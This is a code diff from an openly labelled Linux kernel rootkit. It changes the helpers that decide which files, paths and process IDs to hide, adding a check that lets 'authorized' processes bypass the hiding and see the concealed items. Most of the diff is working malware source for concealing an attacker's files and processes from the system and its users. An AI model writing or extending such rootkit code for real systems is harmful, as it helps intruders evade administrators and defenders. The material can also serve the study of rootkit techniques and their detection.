@@ -324,12 +324,18 @@ static inline bool is_filename_hidden(const char *const s_filename)
  *
  * @param s_filename      The file name to check
  * @param b_is_proc_child Is the file a child of /proc/?
+ * @param b_check_auth    Should we check if the process is authorized?
  * @return `true` if the given file needs to be hidden, `false` otherwise
  */
 static inline bool is_filename_or_pid_hidden(const char *const s_filename,
-                                             const bool b_is_proc_child)
+                                             const bool b_is_proc_child, const bool b_check_auth)
 {
     pid_t i32_pid = 0; // PID as an integer
+
+    IF_U (b_check_auth && is_process_authorized(PID_SELF)) {
+        pr_info("[ROOTKIT]   * Process is authorized, bypassing checks...\n");
+        return false;
+    }
 
     // Check the name starts with the hidden prefix
     IF_U (is_filename_hidden(s_filename)) {
@@ -406,41 +412,29 @@ static inline bool is_path_hierarchy_hidden(const path_t *const p_path)
  * @note Checks if the dentry is a process file/dir and needs to be hidden,
  *       or if the file name starts with the hidden prefix.
  *
- * @param p_dentry The dentry structure to check
+ * @param p_dentry     The dentry structure to check
+ * @param b_check_auth Should we check if the process is authorized?
  * @return `true` if the given dentry needs to be hidden, `false` otherwise
  */
-bool is_dentry_hidden(const dentry_t *const p_dentry);
+bool is_dentry_hidden(const dentry_t *const p_dentry, const bool b_check_auth);
 
 /**
  * Does the given path need to be hidden?
  * @note Checks if the path is a process file/dir and needs to be hidden,
  *       or if the file name starts with the hidden prefix.
  *
- * @param p_path The path structure to check
+ * @param p_path       The path structure to check
+ * @param b_check_auth Should we check if the process is authorized?
  * @return `true` if the given path needs to be hidden, `false` otherwise
  */
-static inline bool is_path_hidden(const path_t *const p_path)
+static inline bool is_path_hidden(const path_t *const p_path, const bool b_check_auth)
 {
     IF_U (p_path == NULL) {
         return false;
     }
 
-    return is_dentry_hidden(p_path->dentry);
+    return is_dentry_hidden(p_path->dentry, b_check_auth);
 }
-
-/**
- * Does the given pathname need to be hidden?
- * @note Checks if the pathname is a process file/dir and needs to be hidden,
- *       or if the file name starts with the hidden prefix.
- * @note Path is checked twice: first with `AT_SYMLINK_NOFOLLOW`, then with `AT_SYMLINK_FOLLOW`.
- *
- * @param i32_dfd          The file descriptor of the directory containing the pathname, or `AT_FDCWD`
- * @param s_pathname       The pathname to check
- * @param i32_lookup_flags Flags to use when resolving the pathname (`LOOKUP_*` flags, not `AT_*` or `O_*`)
- * @return `true` if the given pathname needs to be hidden, `false` otherwise
- */
-bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
-                        unsigned int i32_lookup_flags);
 
 /**
  * Does the given file need to be hidden?
@@ -450,14 +444,29 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
  * @param p_file The file structure to check
  * @return `true` if the given file needs to be hidden, `false` otherwise
  */
-static inline bool is_file_hidden(const file_t *const p_file)
+static inline bool is_file_hidden(const file_t *const p_file, const bool b_check_auth)
 {
     IF_U (p_file == NULL) {
         return false;
     }
 
-    return is_path_hidden(&p_file->f_path);
+    return is_path_hidden(&p_file->f_path, b_check_auth);
 }
+
+/**
+ * Does the given pathname need to be hidden?
+ * @note Checks if the pathname is a process file/dir and needs to be hidden,
+ *       or if the file name starts with the hidden prefix.
+ * @note Also checks if the process is authorized.
+ * @note Path is checked twice: first with `AT_SYMLINK_NOFOLLOW`, then with `AT_SYMLINK_FOLLOW`.
+ *
+ * @param i32_dfd          The file descriptor of the directory containing the pathname, or `AT_FDCWD`
+ * @param s_pathname       The pathname to check
+ * @param i32_lookup_flags Flags to use when resolving the pathname (`LOOKUP_*` flags, not `AT_*` or `O_*`)
+ * @return `true` if the given pathname needs to be hidden, `false` otherwise
+ */
+bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
+                        unsigned int i32_lookup_flags);
 
 /**
  * Gets the file structure associated with the given file descriptor.
